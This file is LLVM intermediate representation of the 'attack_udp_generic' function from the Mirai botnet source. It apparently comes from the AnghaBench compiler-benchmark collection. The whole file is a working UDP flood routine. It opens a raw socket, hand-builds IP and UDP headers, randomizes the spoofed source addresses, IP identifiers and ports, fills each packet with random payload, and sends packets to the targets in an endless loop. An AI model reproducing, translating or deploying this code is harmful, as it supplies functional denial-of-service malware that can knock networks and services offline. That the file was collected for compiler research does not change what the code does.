; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_udp.c_attack_udp_generic.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_udp.c_attack_udp_generic.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_target = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i8* }
%struct.attack_option = type { i32 }
%struct.iphdr = type { i32, i32, i32, i32, i32, i32, i64, i32, i32, i8*, i8* }
%struct.udphdr = type { i8*, i8*, i64, i8* }
%struct.sockaddr = type { i32 }

@ATK_OPT_IP_TOS = common dso_local global i32 0, align 4
@ATK_OPT_IP_IDENT = common dso_local global i32 0, align 4
@ATK_OPT_IP_TTL = common dso_local global i32 0, align 4
@ATK_OPT_IP_DF = common dso_local global i32 0, align 4
@FALSE = common dso_local global i32 0, align 4
@ATK_OPT_SPORT = common dso_local global i32 0, align 4
@ATK_OPT_DPORT = common dso_local global i32 0, align 4
@ATK_OPT_PAYLOAD_SIZE = common dso_local global i32 0, align 4
@ATK_OPT_PAYLOAD_RAND = common dso_local global i32 0, align 4
@TRUE = common dso_local global i32 0, align 4
@ATK_OPT_SOURCE = common dso_local global i32 0, align 4
@LOCAL_ADDR = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@MSG_NOSIGNAL = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @attack_udp_generic(i32 %0, %struct.attack_target* %1, i32 %2, %struct.attack_option* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  store i32 %0, i32* %5, align 4
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i32 %2, i32* %7, align 4
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i32, i32* %5, align 4
  %28 = call i8* @calloc(i32 %27, i32 8)
  %29 = bitcast i8* %28 to i8**
  store i8** %29, i8*** %11, align 8
  %30 = load i32, i32* %7, align 4
  %31 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %32 = load i32, i32* @ATK_OPT_IP_TOS, align 4
  %33 = call i8* @attack_get_opt_int(i32 %30, %struct.attack_option* %31, i32 %32, i32 0)
  %34 = ptrtoint i8* %33 to i32
  store i32 %34, i32* %12, align 4
  %35 = load i32, i32* %7, align 4
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = load i32, i32* @ATK_OPT_IP_IDENT, align 4
  %38 = call i8* @attack_get_opt_int(i32 %35, %struct.attack_option* %36, i32 %37, i32 65535)
  %39 = ptrtoint i8* %38 to i32
  store i32 %39, i32* %13, align 4
  %40 = load i32, i32* %7, align 4
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = load i32, i32* @ATK_OPT_IP_TTL, align 4
  %43 = call i8* @attack_get_opt_int(i32 %40, %struct.attack_option* %41, i32 %42, i32 64)
  %44 = ptrtoint i8* %43 to i32
  store i32 %44, i32* %14, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = load i32, i32* @ATK_OPT_IP_DF, align 4
  %48 = load i32, i32* @FALSE, align 4
  %49 = call i8* @attack_get_opt_int(i32 %45, %struct.attack_option* %46, i32 %47, i32 %48)
  store i8* %49, i8** %15, align 8
  %50 = load i32, i32* %7, align 4
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = load i32, i32* @ATK_OPT_SPORT, align 4
  %53 = call i8* @attack_get_opt_int(i32 %50, %struct.attack_option* %51, i32 %52, i32 65535)
  %54 = ptrtoint i8* %53 to i32
  store i32 %54, i32* %16, align 4
  %55 = load i32, i32* %7, align 4
  %56 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %57 = load i32, i32* @ATK_OPT_DPORT, align 4
  %58 = call i8* @attack_get_opt_int(i32 %55, %struct.attack_option* %56, i32 %57, i32 65535)
  %59 = ptrtoint i8* %58 to i32
  store i32 %59, i32* %17, align 4
  %60 = load i32, i32* %7, align 4
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = load i32, i32* @ATK_OPT_PAYLOAD_SIZE, align 4
  %63 = call i8* @attack_get_opt_int(i32 %60, %struct.attack_option* %61, i32 %62, i32 512)
  %64 = ptrtoint i8* %63 to i32
  store i32 %64, i32* %18, align 4
  %65 = load i32, i32* %7, align 4
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = load i32, i32* @ATK_OPT_PAYLOAD_RAND, align 4
  %68 = load i32, i32* @TRUE, align 4
  %69 = call i8* @attack_get_opt_int(i32 %65, %struct.attack_option* %66, i32 %67, i32 %68)
  store i8* %69, i8** %19, align 8
  %70 = load i32, i32* %7, align 4
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = load i32, i32* @ATK_OPT_SOURCE, align 4
  %73 = load i32, i32* @LOCAL_ADDR, align 4
  %74 = call i8* @attack_get_opt_int(i32 %70, %struct.attack_option* %71, i32 %72, i32 %73)
  %75 = ptrtoint i8* %74 to i32
  store i32 %75, i32* %20, align 4
  %76 = load i32, i32* %18, align 4
  %77 = icmp sgt i32 %76, 1460
  br i1 %77, label %78, label %79

78:                                               ; preds = %4
  store i32 1460, i32* %18, align 4
  br label %79

79:                                               ; preds = %78, %4
  %80 = load i32, i32* @AF_INET, align 4
  %81 = load i32, i32* @SOCK_RAW, align 4
  %82 = load i32, i32* @IPPROTO_UDP, align 4
  %83 = call i32 @socket(i32 %80, i32 %81, i32 %82)
  store i32 %83, i32* %10, align 4
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %85, label %86

85:                                               ; preds = %79
  br label %314

86:                                               ; preds = %79
  store i32 1, i32* %9, align 4
  %87 = load i32, i32* %10, align 4
  %88 = load i32, i32* @IPPROTO_IP, align 4
  %89 = load i32, i32* @IP_HDRINCL, align 4
  %90 = call i32 @setsockopt(i32 %87, i32 %88, i32 %89, i32* %9, i32 4)
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

92:                                               ; preds = %86
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %314

95:                                               ; preds = %86
  store i32 0, i32* %9, align 4
  br label %96

96:                                               ; preds = %173, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i32, i32* %5, align 4
  %99 = icmp slt i32 %97, %98
  br i1 %99, label %100, label %176

100:                                              ; preds = %96
  %101 = call i8* @calloc(i32 1510, i32 1)
  %102 = load i8**, i8*** %11, align 8
  %103 = load i32, i32* %9, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8*, i8** %102, i64 %104
  store i8* %101, i8** %105, align 8
  %106 = load i8**, i8*** %11, align 8
  %107 = load i32, i32* %9, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8*, i8** %106, i64 %108
  %110 = load i8*, i8** %109, align 8
  %111 = bitcast i8* %110 to %struct.iphdr*
  store %struct.iphdr* %111, %struct.iphdr** %21, align 8
  %112 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i64 1
  %114 = bitcast %struct.iphdr* %113 to %struct.udphdr*
  store %struct.udphdr* %114, %struct.udphdr** %22, align 8
  %115 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %116 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %115, i32 0, i32 0
  store i32 4, i32* %116, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i32 0, i32 1
  store i32 5, i32* %118, align 4
  %119 = load i32, i32* %12, align 4
  %120 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %121 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %120, i32 0, i32 2
  store i32 %119, i32* %121, align 8
  %122 = load i32, i32* %18, align 4
  %123 = sext i32 %122 to i64
  %124 = add i64 88, %123
  %125 = trunc i64 %124 to i32
  %126 = call i8* @htons(i32 %125)
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 10
  store i8* %126, i8** %128, align 8
  %129 = load i32, i32* %13, align 4
  %130 = call i8* @htons(i32 %129)
  %131 = ptrtoint i8* %130 to i32
  %132 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 3
  store i32 %131, i32* %133, align 4
  %134 = load i32, i32* %14, align 4
  %135 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 4
  store i32 %134, i32* %136, align 8
  %137 = load i8*, i8** %15, align 8
  %138 = icmp ne i8* %137, null
  br i1 %138, label %139, label %143

139:                                              ; preds = %100
  %140 = call i8* @htons(i32 16384)
  %141 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 9
  store i8* %140, i8** %142, align 8
  br label %143

143:                                              ; preds = %139, %100
  %144 = load i32, i32* @IPPROTO_UDP, align 4
  %145 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 8
  store i32 %144, i32* %146, align 4
  %147 = load i32, i32* %20, align 4
  %148 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 5
  store i32 %147, i32* %149, align 4
  %150 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %151 = load i32, i32* %9, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i64 %152
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i32 0, i32 2
  %155 = load i32, i32* %154, align 8
  %156 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 7
  store i32 %155, i32* %157, align 8
  %158 = load i32, i32* %16, align 4
  %159 = call i8* @htons(i32 %158)
  %160 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %161 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %160, i32 0, i32 3
  store i8* %159, i8** %161, align 8
  %162 = load i32, i32* %17, align 4
  %163 = call i8* @htons(i32 %162)
  %164 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %165 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %164, i32 0, i32 0
  store i8* %163, i8** %165, align 8
  %166 = load i32, i32* %18, align 4
  %167 = sext i32 %166 to i64
  %168 = add i64 32, %167
  %169 = trunc i64 %168 to i32
  %170 = call i8* @htons(i32 %169)
  %171 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %172 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %171, i32 0, i32 1
  store i8* %170, i8** %172, align 8
  br label %173

173:                                              ; preds = %143
  %174 = load i32, i32* %9, align 4
  %175 = add nsw i32 %174, 1
  store i32 %175, i32* %9, align 4
  br label %96

176:                                              ; preds = %96
  br label %177

177:                                              ; preds = %313, %176
  %178 = load i32, i32* @TRUE, align 4
  %179 = icmp ne i32 %178, 0
  br i1 %179, label %180, label %314

180:                                              ; preds = %177
  store i32 0, i32* %9, align 4
  br label %181

181:                                              ; preds = %310, %180
  %182 = load i32, i32* %9, align 4
  %183 = load i32, i32* %5, align 4
  %184 = icmp slt i32 %182, %183
  br i1 %184, label %185, label %313

185:                                              ; preds = %181
  %186 = load i8**, i8*** %11, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i8*, i8** %186, i64 %188
  %190 = load i8*, i8** %189, align 8
  store i8* %190, i8** %23, align 8
  %191 = load i8*, i8** %23, align 8
  %192 = bitcast i8* %191 to %struct.iphdr*
  store %struct.iphdr* %192, %struct.iphdr** %24, align 8
  %193 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i64 1
  %195 = bitcast %struct.iphdr* %194 to %struct.udphdr*
  store %struct.udphdr* %195, %struct.udphdr** %25, align 8
  %196 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %197 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %196, i64 1
  %198 = bitcast %struct.udphdr* %197 to i8*
  store i8* %198, i8** %26, align 8
  %199 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %200 = load i32, i32* %9, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i64 %201
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i32 0, i32 0
  %204 = load i32, i32* %203, align 8
  %205 = icmp slt i32 %204, 32
  br i1 %205, label %206, label %228

206:                                              ; preds = %185
  %207 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %208 = load i32, i32* %9, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %210, i32 0, i32 2
  %212 = load i32, i32* %211, align 8
  %213 = call i64 @ntohl(i32 %212)
  %214 = call i8* (...) @rand_next()
  %215 = ptrtoint i8* %214 to i32
  %216 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %217 = load i32, i32* %9, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i64 %218
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 8
  %222 = ashr i32 %215, %221
  %223 = sext i32 %222 to i64
  %224 = add nsw i64 %213, %223
  %225 = call i32 @htonl(i64 %224)
  %226 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 7
  store i32 %225, i32* %227, align 8
  br label %228

228:                                              ; preds = %206, %185
  %229 = load i32, i32* %20, align 4
  %230 = icmp eq i32 %229, -1
  br i1 %230, label %231, label %236

231:                                              ; preds = %228
  %232 = call i8* (...) @rand_next()
  %233 = ptrtoint i8* %232 to i32
  %234 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 5
  store i32 %233, i32* %235, align 4
  br label %236

236:                                              ; preds = %231, %228
  %237 = load i32, i32* %13, align 4
  %238 = icmp eq i32 %237, 65535
  br i1 %238, label %239, label %244

239:                                              ; preds = %236
  %240 = call i8* (...) @rand_next()
  %241 = ptrtoint i8* %240 to i32
  %242 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 3
  store i32 %241, i32* %243, align 4
  br label %244

244:                                              ; preds = %239, %236
  %245 = load i32, i32* %16, align 4
  %246 = icmp eq i32 %245, 65535
  br i1 %246, label %247, label %251

247:                                              ; preds = %244
  %248 = call i8* (...) @rand_next()
  %249 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %250 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %249, i32 0, i32 3
  store i8* %248, i8** %250, align 8
  br label %251

251:                                              ; preds = %247, %244
  %252 = load i32, i32* %17, align 4
  %253 = icmp eq i32 %252, 65535
  br i1 %253, label %254, label %258

254:                                              ; preds = %251
  %255 = call i8* (...) @rand_next()
  %256 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %257 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %256, i32 0, i32 0
  store i8* %255, i8** %257, align 8
  br label %258

258:                                              ; preds = %254, %251
  %259 = load i8*, i8** %19, align 8
  %260 = icmp ne i8* %259, null
  br i1 %260, label %261, label %265

261:                                              ; preds = %258
  %262 = load i8*, i8** %26, align 8
  %263 = load i32, i32* %18, align 4
  %264 = call i32 @rand_str(i8* %262, i32 %263)
  br label %265

265:                                              ; preds = %261, %258
  %266 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %267 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %266, i32 0, i32 6
  store i64 0, i64* %267, align 8
  %268 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %269 = bitcast %struct.iphdr* %268 to i32*
  %270 = call i64 @checksum_generic(i32* %269, i32 56)
  %271 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 6
  store i64 %270, i64* %272, align 8
  %273 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %274 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %273, i32 0, i32 2
  store i64 0, i64* %274, align 8
  %275 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %276 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %277 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %278 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %277, i32 0, i32 1
  %279 = load i8*, i8** %278, align 8
  %280 = load i32, i32* %18, align 4
  %281 = sext i32 %280 to i64
  %282 = add i64 32, %281
  %283 = trunc i64 %282 to i32
  %284 = call i64 @checksum_tcpudp(%struct.iphdr* %275, %struct.udphdr* %276, i8* %279, i32 %283)
  %285 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %286 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %285, i32 0, i32 2
  store i64 %284, i64* %286, align 8
  %287 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %288 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %287, i32 0, i32 0
  %289 = load i8*, i8** %288, align 8
  %290 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %291 = load i32, i32* %9, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %290, i64 %292
  %294 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i32 0, i32 1
  %295 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %294, i32 0, i32 0
  store i8* %289, i8** %295, align 8
  %296 = load i32, i32* %10, align 4
  %297 = load i8*, i8** %23, align 8
  %298 = load i32, i32* %18, align 4
  %299 = sext i32 %298 to i64
  %300 = add i64 88, %299
  %301 = trunc i64 %300 to i32
  %302 = load i32, i32* @MSG_NOSIGNAL, align 4
  %303 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %304 = load i32, i32* %9, align 4
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %303, i64 %305
  %307 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %306, i32 0, i32 1
  %308 = bitcast %struct.TYPE_2__* %307 to %struct.sockaddr*
  %309 = call i32 @sendto(i32 %296, i8* %297, i32 %301, i32 %302, %struct.sockaddr* %308, i32 4)
  br label %310

310:                                              ; preds = %265
  %311 = load i32, i32* %9, align 4
  %312 = add nsw i32 %311, 1
  store i32 %312, i32* %9, align 4
  br label %181

313:                                              ; preds = %181
  br label %177

314:                                              ; preds = %85, %92, %177
  ret void
}

declare dso_local i8* @calloc(i32, i32) #1

declare dso_local i8* @attack_get_opt_int(i32, %struct.attack_option*, i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @htonl(i64) #1

declare dso_local i64 @ntohl(i32) #1

declare dso_local i8* @rand_next(...) #1

declare dso_local i32 @rand_str(i8*, i32) #1

declare dso_local i64 @checksum_generic(i32*, i32) #1

declare dso_local i64 @checksum_tcpudp(%struct.iphdr*, %struct.udphdr*, i8*, i32) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
